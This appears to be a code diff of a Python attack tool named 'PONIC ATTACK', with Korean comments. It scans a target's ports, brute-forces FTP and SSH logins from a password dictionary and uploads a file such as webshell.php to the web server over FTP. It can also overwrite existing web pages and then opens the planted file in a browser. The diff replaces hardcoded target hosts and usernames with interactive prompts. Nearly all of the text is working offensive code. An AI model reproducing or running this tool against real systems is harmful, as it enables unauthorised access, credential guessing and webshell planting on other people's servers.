@@ -9,38 +9,42 @@ import socket
 import os
 import ftplib
 import webbrowser
-# import argparse
 import time
 import paramiko
 from paramiko import SSHClient, AutoAddPolicy
 import logging
 from colorama import Fore, init
-# import getpass
-# import telnetlib
-# import requests
+
 
 class AutoAttack:
   def __init__(self):
-    # self.target = input("Input target IP : ")
-    self.target = "192.168.0.34"
+    self.target = ""
     self.target_ports = []
-
-    # self.ftp_host = input("Input target TCP host : ")
-    # self.ftp_username = input("Input target TCP username : ")
     self.ftp_flag = False
-    # self.ftp_redirect = input("Input injection code : ")  #삽입할 코드 입력
-    self.ftp_host = "www.kae.kr"
-    self.ftp_username = "master"
+    self.ftp_host = ""
+    self.ftp_username = ""
     self.ftp_passwd = None
     self.ftp_redirect = "ls -al"
-    #self.ftp_set_path = "/home/" + self.ftp_username + "/public_html/master"
-    self.ftp_set_path = "/home/aheun"
-
+    # self.ftp_redirect = input("Input injection code : ")  #삽입할 코드 입력
+    self.ftp_set_path = ""
+    # self.ftp_set_path = "/home/" + self.ftp_username + "/public_html/master"
+    self.upload_file = ""
     self.ssh_flag = False
-    self.ssh_username = "master"
+    self.ssh_username = ""
     self.ssh_passwd = None
-    # self.ssh_code_inject = input("Input injection code : ")
     self.ssh_code_inject = ""
+
+    self.welcomeMenu()
+
+
+  def welcomeMenu(self):
+    print(">>>>>>>>>>>>>>>>>>>> PONIC ATTACK <<<<<<<<<<<<<<<<<<<<")
+    self.target = input("Input target IP (ex. 192.168.0.34) : ")
+    self.ftp_host = input("Input target FTP host (ex. www.kae.kr) : ")
+    self.ftp_username = input("Input target FTP username (ex. aheun) : ")
+    self.ftp_set_path = input("Input target FTP default path (ex. /home/aheun) : ")
+    self.upload_file = input("Input target FTP want upload_file (ex. webshell.php) : ")
+    self.ssh_username = input("Input target SSH username (ex. master) : ")
 
 
   ############### before attack, check is port open ###############
@@ -71,7 +75,7 @@ class AutoAttack:
 
 
   def scanner(self):
-    print("\n\n[ port scan ]")
+    print("\n\n>>>>>>>>>>>>>>>>>>>> PORT SCAN <<<<<<<<<<<<<<<<<<<<")
     global q
     threads = [] # 스레드 관리 목록
     chk_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5900]
@@ -84,7 +88,7 @@ class AutoAttack:
 
     # 연결된다면 q에 확인할 포트 넣기
     if alive == 0:
-      print("connect target")
+      print()
       for port in chk_ports:
         q.put(port)
     else:
@@ -101,7 +105,6 @@ class AutoAttack:
       t.join()
 
     print("\n[*] Found open ports: ", self.target_ports)
-    print("[ end port scan ]")
 
 
   ############### ftp attack : ftpAttack -> ftpBrute -> ftpInjection ###############
@@ -115,12 +118,10 @@ class AutoAttack:
         break
       
       passwd = q.get()
-
       try:
         ftp_conn = ftplib.FTP(self.ftp_host)
         ftp_conn.login(self.ftp_username, passwd)
       except ftplib.error_perm:
-        #print("not ", passwd)
         pass
       else:
         # correct credentials
@@ -129,7 +130,7 @@ class AutoAttack:
         self.ftp_passwd = passwd
         self.ftp_flag = True
 
-  def returnDefault(self, ftp): #웹 페이지 검색
+  def returnDefault(self, ftp): #웹 페이지 파일 검색
     try:
       dirList = ftp.nlst() #현재 디렉토리 파일 확인
       print("dirList : ", dirList)
@@ -142,53 +143,52 @@ class AutoAttack:
     retList = []
     for fileName in dirList:
       fn = fileName.lower()
-      if '.php' in fn or '.htm' in fn or '.asp' in fn: #if문과 같은 확장자를 가진 파일이 있는지 체크
-          print ('[+] Found default page: ' + fileName) #찾았다는 문구 출력
+      if '.php' in fn or '.htm' in fn or '.asp' in fn:
+          print ('[+] Found default page: ' + fileName)
           retList.append(fileName) #파일명 추가
     return retList
 
-  def injectPage(self, ftp, page, redirect): #악성코드 삽입
-    # 서버에서 클라이언트로 파일 수신
-    # f = open(page + '.tmp', 'w')
-    # ftp.retrlines('RETR ' + page, f.write) #아스키모드에서 FTP서버에서 FTP 클라이언트로 파일수신
-    # print ('[+] Downloaded Page: ' + page) 
-    # f.write(redirect)
-    # f.close()
 
-    # 클라이언트에서 서버로 파일 송신
-    ### 권한이 없으면 upload가 안됨,,! 예외처리 혹은 디렉터리 별 업로드 기능이 필요할 듯
-    upload_file = "aheunws.php"
-    print('[+] Injected Malicious IFrame on: ' + upload_file)
+  # 서버에서 클라이언트로 파일 수신
+  def getPage(self, ftp, page, redirect):
+    f = open(page + '.tmp', 'w')
+    ftp.retrlines('RETR ' + page, f.write) #아스키모드에서 FTP서버에서 FTP 클라이언트로 파일수신
+    print ("[+] Downloaded file : " + page) 
+    f.write(redirect)
+    f.close()
 
-    with open(upload_file, 'rb') as read_f:
-      # 기존 파일 덮어쓰려면 page 넣기
-      # ftp.storlines('STOR ' + page, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
-      # 새로 만들려면 파일명 직접 넣기
-      ftp.storlines('STOR ' + "mywebshell.php", read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
 
-      # webbrowser.open("http://www.kae.kr/aheunws.php")
-      # webbrowser.open("http://" + self.ftp_host + "/aheun/mywebshell.php") # 여기 어떻게 할까?
+  # 클라이언트에서 서버로 파일 송신 (changePage, injectPage)
+  ### 권한이 없으면 upload가 안됨,,! 예외처리 혹은 디렉터리 별 업로드 기능이 필요할 듯
+  def changePage(self, ftp, before_page):
+    print("[*] Changed " + before_page + " to " + self.upload_file)
+    with open(self.upload_file, 'rb') as read_f:
+      ftp.storlines('STOR ' + before_page, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
+    print ("[*] Changed " + before_page)
 
-    print ('[*] Uploaded injected page: ' + upload_file)
+
+  def injectPage(self, ftp):
+    print('[+] Injected Malicious file : ' + self.upload_file)
+    with open(self.upload_file, 'rb') as read_f:
+      ftp.storlines('STOR ' + self.upload_file, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
+    print ("[*] Uploaded injected file : " + self.upload_file)
+    webbrowser.open("http://" + self.ftp_host + "/" + self.upload_file)
+
 
   def ftpInjection(self):
-      ftp_conn = ftplib.FTP(self.ftp_host)
-      ftp_conn.login(self.ftp_username, self.ftp_passwd)
-      # print("pwd : ", ftp_conn.pwd())
-      # ftp_conn.cwd("/home/" + self.ftp_username + "/public_html") # 설정한 경로로 이동
+    ftp_conn = ftplib.FTP(self.ftp_host)
+    ftp_conn.login(self.ftp_username, self.ftp_passwd)
+    ftp_conn.cwd(self.ftp_set_path) # 설정한 경로로 이동
+    defPages = self.returnDefault(ftp_conn) # 설정 경로의 웹 페이지들 확인
 
-
-      ftp_conn.cwd(self.ftp_set_path) # 설정한 경로로 이동
-      defPages = self.returnDefault(ftp_conn) # 설정 경로의 웹 페이지들 확인
-      print("pages", defPages)
-
-      self.injectPage(ftp_conn, defPages[0], self.ftp_redirect) #injectPage 호출
-      # for defPage in defPages:
-      #   self.injectPage(ftp_conn, defPage, redirect) #injectPage 호출
+    self.injectPage(ftp_conn)
+    # for defPage in defPages:
+    #   self.getPage(ftp_conn, defPage, "ls -al")
+    #   self.changePage(ftp_conn, defPage)
 
 
   def ftpAttack(self):
-    print("\n\n[ ftp attack ]")
+    print("\n\n>>>>>>>>>>>>>>>>>>>> FTP ATTACK <<<<<<<<<<<<<<<<<<<<")
     global q
     threads = [] # 스레드 관리 목록
     passwdFile = "dic_passwd.txt"
@@ -217,8 +217,6 @@ class AutoAttack:
     if self.ftp_passwd != None:
         print('[+] Using creds: ' + self.ftp_username + '/' + self.ftp_passwd + ' to attack')
         self.ftpInjection()
-        
-    print("[ end ftp attack ]")
 
 
   ############### ssh attack : sshAttack ->  ###############
@@ -263,7 +261,7 @@ class AutoAttack:
 
 
   def sshAttack(self):
-    print("\n\n[ ssh attack ]")
+    print("\n\n>>>>>>>>>>>>>>>>>>>> SSH ATTACK <<<<<<<<<<<<<<<<<<<<")
     global q
     threads = [] # 스레드 관리 목록
     passwdFile = "dic_passwd.txt"
@@ -292,18 +290,6 @@ class AutoAttack:
     if self.ssh_passwd != None:
       print('[+] Using creds: ' + self.ssh_username + '/' + self.ssh_passwd + ' to attack')
       self.sshInjection()
-
-    print("[ end ssh attack ]")
-
-
-  def telnetAttack():
-    pass
-
-  def smtpAttack():
-    pass
-
-  def prn(self):
-    pass
 
 
 def main():
